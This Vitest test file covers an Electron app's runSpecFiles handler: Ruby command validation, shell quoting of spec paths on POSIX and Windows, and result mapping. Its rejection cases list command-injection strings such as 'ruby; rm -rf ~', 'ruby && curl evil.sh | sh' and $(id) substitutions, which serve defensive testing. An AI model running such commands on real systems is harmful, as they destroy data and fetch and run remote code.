import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'

const mockSafeExec = vi.hoisted(() => vi.fn())
vi.mock('electron', () => ({ BrowserWindow: class {} }))
vi.mock('../../src/main/utils/safeExec', () => ({ safeExec: mockSafeExec }))

import { runSpecFiles, toRunResult } from '../../src/main/handlers/testing/runSpecFiles'

beforeEach(() => {
  mockSafeExec.mockReset()
  mockSafeExec.mockResolvedValue({ stdout: '{}', stderr: '', exitCode: 0 })
})

describe('runSpecFiles ruby command', () => {
  it.each([
    'ruby',
    '/Users/me/.rbenv/shims/ruby',
    '~/.rbenv/shims/ruby',
    'eval "$(rbenv init -)" && rbenv shell 3.3.0 && ruby',
    'eval "$(rbenv init -)" && rbenv shell jruby-9.4.0.0 && ruby',
    'source $(brew --prefix rvm)/scripts/rvm && rvm 3.3.0 do ruby',
    'source $(brew --prefix rvm)/scripts/rvm && rvm ruby-3.3.0@gemset do ruby'
  ])('accepts %s', async (cmd) => {
    await runSpecFiles('/p', ['spec/a_spec.rb'], cmd)
    expect(mockSafeExec).toHaveBeenCalledTimes(1)
  })

  it.each([
    'ruby; rm -rf ~',
    'ruby && curl evil.sh | sh',
    'ruby $(id)',
    'ruby `id`',
    'ruby\ntouch x',
    'ruby > /tmp/x',
    "ruby 'x'",
    'eval "$(rbenv init -)" && rbenv shell 3.3.0; id && ruby',
    'source $(brew --prefix rvm)/scripts/rvm && rvm 3.3.0; id do ruby',
    'source $(brew --prefix rvm)/scripts/rvm && rvm $(id) do ruby',
    '',
    undefined,
    42
  ])('rejects %s without running anything', async (cmd) => {
    await expect(runSpecFiles('/p', ['spec/a_spec.rb'], cmd as never)).rejects.toThrow(
      /Ruby command/
    )
    expect(mockSafeExec).not.toHaveBeenCalled()
  })
})

describe('runSpecFiles quoting', () => {
  it('quotes each spec file and the project folder so the shell takes them literally', async () => {
    await runSpecFiles(
      "/Users/me/QA's $tests",
      ['spec/my tests/a_spec.rb', 'spec/b_spec.rb', 'spec/say "hi"_spec.rb'],
      'ruby'
    )
    const command = mockSafeExec.mock.calls[0][0] as string
    expect(command).toContain(`cd '/Users/me/QA'\\''s $tests' && `)
    expect(command).toContain(
      `ruby -S rspec 'spec/my tests/a_spec.rb' spec/b_spec.rb 'spec/say "hi"_spec.rb' --format json`
    )
  })

  describe('on win32', () => {
    const platform = process.platform
    beforeEach(() => Object.defineProperty(process, 'platform', { value: 'win32' }))
    afterEach(() => Object.defineProperty(process, 'platform', { value: platform }))

    it('double-quotes for cmd.exe, which does not treat single quotes as quotes', async () => {
      await runSpecFiles('C:\\QA tests', ['spec/my tests/a_spec.rb', 'spec/b_spec.rb'], 'ruby')
      expect(mockSafeExec.mock.calls[0][0]).toBe(
        'cd /d "C:\\QA tests" && ruby -S rspec "spec/my tests/a_spec.rb" spec/b_spec.rb --format json'
      )
    })
  })
})

describe('toRunResult', () => {
  it('a zero exit is a passed run with rspec output', () => {
    expect(toRunResult({ stdout: '{}', stderr: 'warning', exitCode: 0 })).toEqual({
      success: true,
      output: '{}'
    })
  })

  it('a non-zero exit is a failed run even with nothing on stderr', () => {
    // rspec prints load errors and failing examples to stdout
    const stdout = 'LoadError: cannot load such file -- allure\n0 examples, 0 failures, 1 error'
    expect(toRunResult({ stdout, stderr: '', exitCode: 1 })).toEqual({
      success: false,
      output: stdout
    })
  })

  it('a failed run keeps stderr and stdout', () => {
    const result = toRunResult({ stdout: 'out', stderr: 'boom', exitCode: 1 })
    expect(result.success).toBe(false)
    expect(result.output).toContain('boom')
    expect(result.output).toContain('out')
  })
})
